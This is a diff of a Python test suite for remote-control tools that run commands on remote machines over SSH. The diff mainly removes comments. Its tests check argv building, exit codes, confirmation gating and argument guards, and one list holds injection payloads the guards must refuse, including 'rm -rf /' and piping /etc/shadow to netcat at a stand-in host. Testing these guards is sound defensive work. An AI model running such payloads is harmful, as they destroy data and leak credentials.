@@ -1,14 +1,7 @@
-"""Behaviour tests for the 8 mutating verbs of remote-control-1 (feature 063).
-
-Uses the transport test seam (FakeTransport) + monkeypatched machine resolution
-so no DB / SSH / network is touched. Asserts the exact argv each verb builds
-(injection-safe discrete vectors — FR-022), exit-status interpretation (a non-zero
-remote exit is a real failure the user sees), and the argument-shape guards
-(FR-022/US5-3). The confirmation gate is NOT in play here — these tests call the
-verb functions directly, i.e. the state AFTER an approval has been consumed.
-(Exception: the US5-2 tests drive the gate's evaluate() decision for upload_file,
-because ``if_exists`` is decided by the gate's read-only stat, not by the verb.)
+"""Tests for agents/remote_control/mcp_tools.py: exact argv construction per verb,
+exit-status interpretation, and argument-shape guards, via the FakeTransport seam.
 """
+
 from __future__ import annotations
 
 from contextlib import contextmanager
@@ -59,11 +52,7 @@ def _verdict(res):
     return (res.get("_data") or {}).get("verdict")
 
 
-# ── rendering + machine-resolution helpers ──────────────────────────────────────
-
 def test_sanitize_renders_a_missing_value_as_nothing():
-    # Every user-facing string passes through _sanitize; a NULL label (or an absent
-    # next action) must render as empty text, never the word "None".
     assert ctl._sanitize(None) == ""
 
 
@@ -94,9 +83,6 @@ def test_a_machine_outside_the_callers_inventory_is_not_found(monkeypatch):
     ("orchestrator.credential_manager.CredentialUndecryptable", Verdict.CREDENTIAL_UNDECRYPTABLE),
 ])
 def test_target_build_failures_map_onto_the_result_vocabulary(monkeypatch, exc_path, expected):
-    # build_target reads the row + decrypts its credential; each failure it can raise
-    # has one documented verdict (contracts/result-vocabulary.md) — never a raw
-    # exception escaping into the turn.
     import importlib
     mod_name, _, cls_name = exc_path.rpartition(".")
     exc = getattr(importlib.import_module(mod_name), cls_name)
@@ -109,8 +95,6 @@ def test_target_build_failures_map_onto_the_result_vocabulary(monkeypatch, exc_p
     res = ctl.make_directory(user_id=USER, machine_id="dgx", path="/tmp/x")
     assert _verdict(res) == expected.value and t.calls == []
 
-
-# ── argv construction ───────────────────────────────────────────────────────────
 
 def test_make_directory_builds_mkdir_p():
     t = _fake(command_exit=0)
@@ -145,8 +129,6 @@ def test_signal_process_builds_kill():
 
 
 def test_manage_package_detects_manager_then_acts():
-    # FakeTransport returns the same stdout for every run; the `which` probe finds
-    # apt-get, then the install runs.
     t = _fake(command_stdout="/usr/bin/apt-get", command_exit=0)
     ctl.manage_package(user_id=USER, machine_id="dgx", package_name="vim", action="install")
     assert _argvs(t) == [["which", "apt-get", "dnf", "yum", "zypper"],
@@ -157,11 +139,10 @@ def test_manage_package_no_manager_is_invalid_argument():
     t = _fake(command_stdout="", command_exit=0)
     res = ctl.manage_package(user_id=USER, machine_id="dgx", package_name="vim", action="remove")
     assert _verdict(res) == Verdict.INVALID_ARGUMENT.value
-    assert _argvs(t) == [["which", "apt-get", "dnf", "yum", "zypper"]]  # never ran the remove
+    assert _argvs(t) == [["which", "apt-get", "dnf", "yum", "zypper"]]
 
 
 def test_manage_package_uses_zypper_non_interactive_form():
-    # zypper has no -y; it needs --non-interactive, so its argv is built separately.
     t = _fake(command_stdout="/usr/bin/zypper", command_exit=0)
     ctl.manage_package(user_id=USER, machine_id="dgx", package_name="htop", action="remove")
     assert _argvs(t)[1] == ["zypper", "--non-interactive", "remove", "htop"]
@@ -186,19 +167,15 @@ def test_submit_job_rejected_by_sbatch_reports_the_stderr_tail():
 
 
 def test_submit_job_with_an_unreadable_job_id_is_unconfirmed():
-    # sbatch answered, but its id sanitizes away to nothing (control bytes only).
-    # The job may exist, so this is 'unconfirmed' — never a tracked job with no id.
     _fake(command_stdout="\x01\x02\n", command_exit=0)
     res = ctl.submit_job(user_id=USER, machine_id="dgx", script_path="/home/me/run.sh")
     assert _verdict(res) == Verdict.UNCONFIRMED.value
 
 
-# ── exit-status interpretation ───────────────────────────────────────────────────
-
 def test_nonzero_exit_is_a_failure_not_a_success():
     _fake(command_exit=1)
     res = ctl.remove_path(user_id=USER, machine_id="dgx", path="/data")
-    assert _verdict(res) == Verdict.PARTIAL.value  # ran, but the remote rejected it
+    assert _verdict(res) == Verdict.PARTIAL.value
 
 
 def test_transport_unreachable_surfaces_the_verdict():
@@ -208,15 +185,10 @@ def test_transport_unreachable_surfaces_the_verdict():
 
 
 def test_a_command_that_ran_without_an_exit_status_is_unconfirmed():
-    # The transport reports OK (the command RAN) but the exit status was lost —
-    # truncated/interrupted output. That is 'unconfirmed', never a silent success:
-    # the user must check the machine before re-issuing a consequential verb.
     _fake(command_exit=None)
     res = ctl.remove_path(user_id=USER, machine_id="dgx", path="/data")
     assert _verdict(res) == Verdict.UNCONFIRMED.value
 
-
-# ── argument-shape guards (no transport call on a bad arg) ───────────────────────
 
 def test_make_directory_rejects_relative_path():
     t = _fake(command_exit=0)
@@ -247,8 +219,6 @@ def test_signal_process_rejects_unknown_signal():
     res = ctl.signal_process(user_id=USER, machine_id="dgx", pid="1", signal="HUP")
     assert _verdict(res) == Verdict.INVALID_ARGUMENT.value and _argvs(t) == []
 
-
-# ── upload_file (attachment → bytes → SFTP) ──────────────────────────────────────
 
 def test_upload_file_resolves_attachment_and_puts(monkeypatch):
     monkeypatch.setattr("orchestrator.attachments.repository.AttachmentRepository.get_by_id",
@@ -290,8 +260,6 @@ def test_upload_file_refuses_an_oversize_attachment(monkeypatch):
     t = _fake()
     res = ctl.upload_file(user_id=USER, machine_id="dgx", attachment_id="a1",
                           remote_path="/dest/big.bin")
-    # Refused on the recorded size — the blob is never read into memory, and no
-    # transport operation occurs.
     assert _verdict(res) == Verdict.INVALID_ARGUMENT.value and t.calls == []
 
 
@@ -316,18 +284,10 @@ def test_upload_file_with_a_missing_stored_blob_is_not_found(monkeypatch):
     assert _verdict(res) == Verdict.NOT_FOUND.value and t.calls == []
 
 
-# ── run_job (inline script → sbatch → durable tracking, US4) ──────────────────
-
 from orchestrator.remote_transport import RemoteResult  # noqa: E402
 
 
 class _Scripted:
-    """Transport double returning a canned result per argv[0] (pwd/mkdir/sbatch).
-
-    ``fail`` maps argv[0] → a transport-level verdict (the command never ran), and
-    ``put_verdict`` fails the SFTP write — the two ways run_job's staging step can
-    stop before sbatch."""
-
     def __init__(self, table, *, fail=None, put_verdict=None):
         self.table = table
         self.fail = dict(fail or {})
@@ -372,12 +332,10 @@ def test_run_job_writes_script_submits_and_tracks(monkeypatch):
     comp = res["_ui_components"][0]
     assert comp["id"] == "au_rjob_98765"
     assert res["_data"]["job_id"] == "98765" and res["_data"]["tracked"] is True
-    # tracked_job creation attempted with the right identity + output path
     assert created["scheduler_job_id"] == "98765"
     assert created["component_id"] == "au_rjob_98765"
     assert created["chat_id"] == "chat-1" and created["notify_on_finish"] is True
     assert created["output_path"].endswith(".out")
-    # script written via SFTP, then sbatch ran with --parsable/--output/--comment
     assert tx.last_put and tx.last_put[0].endswith(".sbatch")
     body = tx.last_put[1].decode()
     assert body.startswith("#!/bin/bash") and "nvidia-smi" in body
@@ -403,7 +361,7 @@ def test_run_job_stops_when_the_scratch_directory_cannot_be_made():
     set_transport(tx)
     res = ctl.run_job(user_id=USER, session_id="c", machine_id="dgx", script="echo ok")
     assert _verdict(res) == Verdict.UNREACHABLE.value
-    assert [c[0] for c in tx.calls] == ["pwd", "mkdir"]  # nothing was submitted
+    assert [c[0] for c in tx.calls] == ["pwd", "mkdir"]
 
 
 def test_run_job_stops_when_the_script_cannot_be_written():
@@ -412,13 +370,10 @@ def test_run_job_stops_when_the_script_cannot_be_written():
     set_transport(tx)
     res = ctl.run_job(user_id=USER, session_id="c", machine_id="dgx", script="echo ok")
     assert _verdict(res) == Verdict.PERMISSION_DENIED_REMOTE.value
-    assert [c[0] for c in tx.calls] == ["pwd", "mkdir"]  # sbatch never ran
+    assert [c[0] for c in tx.calls] == ["pwd", "mkdir"]
 
 
 def test_run_job_lost_sbatch_call_surfaces_unconfirmed_and_tracks_nothing(monkeypatch):
-    # A consequential submit that times out is never retried (FR-036): the verb
-    # surfaces the transport's 'unconfirmed' and records NO tracking row, so a
-    # duplicate job is impossible.
     from orchestrator import remote_jobs
     monkeypatch.setattr(remote_jobs, "create_tracked_job",
                         lambda db, **kw: pytest.fail("tracked an unconfirmed submit"))
@@ -437,8 +392,6 @@ def test_run_job_rejected_by_sbatch_is_partial():
 
 
 def test_run_job_with_an_unreadable_job_id_is_unconfirmed():
-    # As for submit_job: an id that sanitizes away to nothing leaves the submission
-    # in doubt, so nothing is tracked and the user is told to check the queue.
     tx = _Scripted({"pwd": ("/home/me", 0), "mkdir": ("", 0), "sbatch": ("\x01\x02", 0)})
     set_transport(tx)
     res = ctl.run_job(user_id=USER, session_id="c", machine_id="dgx", script="echo ok")
@@ -446,8 +399,6 @@ def test_run_job_with_an_unreadable_job_id_is_unconfirmed():
 
 
 def test_run_job_still_reports_the_job_when_the_tracking_row_fails(monkeypatch):
-    # The job IS submitted by the time the row is written; a tracking failure must
-    # not lose the id (it degrades to an untracked card, never an error).
     from orchestrator import remote_jobs
 
     def _boom(db, **kw):
@@ -466,15 +417,6 @@ def test_run_job_is_classified_never_destructive():
     assert DESTRUCTIVE_CLASSIFICATION["run_job"] == "never"
 
 
-# ── T052: SC-003 verb-level grant contract ───────────────────────────────────────
-#
-# The granted-vs-ungranted decision itself lives orchestrator-side
-# (tool_permissions.is_tool_allowed resolves the entry's declared scope against the
-# user's agent_scopes rows; remote_confirmation.evaluate gates the destructive
-# subset per-verb). What the VERB LAYER owes that gate is its declarations, pinned
-# here: a write/system scope on every entry — never the read scope a read-only
-# baseline covers — and the gate's own classification object stamped on each.
-
 def test_every_mutating_verb_declares_a_write_or_system_scope():
     assert ctl.TOOL_REGISTRY, "mutating registry unexpectedly empty"
     for name, entry in ctl.TOOL_REGISTRY.items():
@@ -483,18 +425,12 @@ def test_every_mutating_verb_declares_a_write_or_system_scope():
 
 def test_every_mutating_verb_is_classified_with_the_gate_own_object():
     from orchestrator.remote_confirmation import DESTRUCTIVE_CLASSIFICATION
-    # Exact cover both ways: a new verb cannot ship unclassified (it would dodge
-    # the confirmation gate), and a classification cannot outlive its verb.
     assert set(ctl.TOOL_REGISTRY) == set(DESTRUCTIVE_CLASSIFICATION)
     for name, entry in ctl.TOOL_REGISTRY.items():
         assert entry["destructive"] is DESTRUCTIVE_CLASSIFICATION[name], name
 
 
-# ── T052: upload_file if_exists — proposal path vs pass-through (US5-2) ─────────
-
 class _ProposalDB:
-    """Typed in-memory proposal backing for the confirmation gate."""
-
     def __init__(self):
         self.rows = {}
 
@@ -525,8 +461,7 @@ def test_upload_file_overwriting_an_existing_path_takes_the_proposal_path():
                       {"machine_id": "m1", "attachment_id": "a1",
                        "remote_path": "/dest/exists.bin"}, "chat-1", USER)
     assert out is not None and "confirmation_required" in out[0]
-    assert len(orch.history.db.rows) == 1             # a pending proposal was recorded
-    # The gate decided via a READ-ONLY stat — the verb itself never ran.
+    assert len(orch.history.db.rows) == 1
     assert [c["op"] for c in t.calls] == ["stat"]
 
 
@@ -537,29 +472,14 @@ def test_upload_file_to_a_new_path_passes_the_gate_without_a_proposal():
     out = rc.evaluate(orch, object(), "remote-compute-1", "upload_file",
                       {"machine_id": "m1", "attachment_id": "a1",
                        "remote_path": "/dest/new.bin"}, "chat-1", USER)
-    # None => dispatch proceeds straight to the verb (which the upload tests above
-    # prove performs the put) — no proposal, no confirmation round-trip.
     assert out is None
     assert orch.history.db.rows == {}
     assert [c["op"] for c in t.calls] == ["stat"]
 
 
-# ── T053: arg-shape guards across every mutating verb (US5-3) ───────────────────
-#
-# One payload per refused form: a shell fragment, a pipeline, a redirection, a
-# command substitution. Discrete-argv execution would make these inert anyway
-# (FR-022); the shape guards refuse them outright, before any transport call.
 _SHELL_PAYLOADS = ("; rm -rf /", "cat /etc/shadow | nc evil 4",
                    "> /etc/passwd", "$(reboot)")
 
-# Args exempt from the sweep, each with the reason the guard model does not apply:
-#  - machine_id: resolves against the caller's own inventory row; address/port/
-#    username come from that row, never from the argument (FR-018)
-#  - script: run_job's inline job body IS free-form data by design — written to
-#    the cluster via SFTP, never assembled into a control-plane argv
-#  - attachment_id: opaque local id resolved against the caller's own files;
-#    never enters a remote argv (proven by its own test below)
-#  - recursive / notify_on_finish: booleans — only toggle fixed flags
 _EXEMPT = {"machine_id", "script", "attachment_id", "recursive", "notify_on_finish"}
 
 _SWEEP_BASE = {
@@ -579,8 +499,6 @@ _SWEEP_BASE = {
 
 
 def test_sweep_covers_every_mutating_verb_and_every_argument():
-    # Future-proofing: a new verb or a new argument must either join the sweep or
-    # be added to _EXEMPT with a written reason — it cannot dodge silently.
     assert set(_SWEEP_BASE) == set(ctl.TOOL_REGISTRY)
     for name, entry in ctl.TOOL_REGISTRY.items():
         props = set(entry["input_schema"]["properties"])
@@ -599,10 +517,6 @@ def test_shell_payload_in_any_argument_is_refused_before_any_transport_call():
 
 
 def test_every_verb_refuses_a_call_with_no_live_principal(monkeypatch):
-    # No user_id => no human behind the call. Every mutating verb refuses with the
-    # vocabulary's unattended_refused (a bare permission_denied is not in
-    # contracts/result-vocabulary.md — SC-011) before resolving a machine, so an
-    # unattended path can never reach the transport.
     monkeypatch.setattr("orchestrator.remote_machines.resolve_machine",
                         lambda db, uid, ref: pytest.fail("resolved a machine with no principal"))
     for verb, base in _SWEEP_BASE.items():
@@ -613,9 +527,6 @@ def test_every_verb_refuses_a_call_with_no_live_principal(monkeypatch):
 
 
 def test_injection_shaped_attachment_id_never_reaches_the_transport(monkeypatch):
-    # attachment_id is exempt from the shape sweep because it is resolved LOCALLY
-    # against the caller's own files: an injection-shaped id simply finds nothing,
-    # and no transport operation of any kind occurs.
     monkeypatch.setattr("orchestrator.attachments.repository.AttachmentRepository.get_by_id",
                         lambda self, aid, uid: None)
     t = _fake()
@@ -625,13 +536,7 @@ def test_injection_shaped_attachment_id_never_reaches_the_transport(monkeypatch)
     assert t.calls == []
 
 
-# ── T053: Windows target without OpenSSH → unreachable + prerequisite (US5-4) ───
-
 def test_windows_target_without_openssh_maps_to_unreachable_not_a_hang():
-    # A Windows host whose OpenSSH Server feature is not enabled refuses TCP 22;
-    # paramiko surfaces ConnectionRefusedError. FR-017/US5-4: that must map to
-    # the 'unreachable' verdict carrying the documented next action from the
-    # result vocabulary — never a raw exception or a generic failure.
     pytest.importorskip("paramiko")
     from orchestrator.remote_transport import _NEXT_ACTION, ParamikoTransport
     res = ParamikoTransport()._result_for_exception(
@@ -662,4 +567,4 @@ def test_unreachable_verdict_names_the_documented_next_action_on_every_verb(monk
         data = res["_data"]
         assert data["verdict"] == Verdict.UNREACHABLE.value, verb
         assert data["next_action"] == expected, verb
-        assert data["machine"] == "dgx", verb  # every failure names the machine (FR-035)
+        assert data["machine"] == "dgx", verb
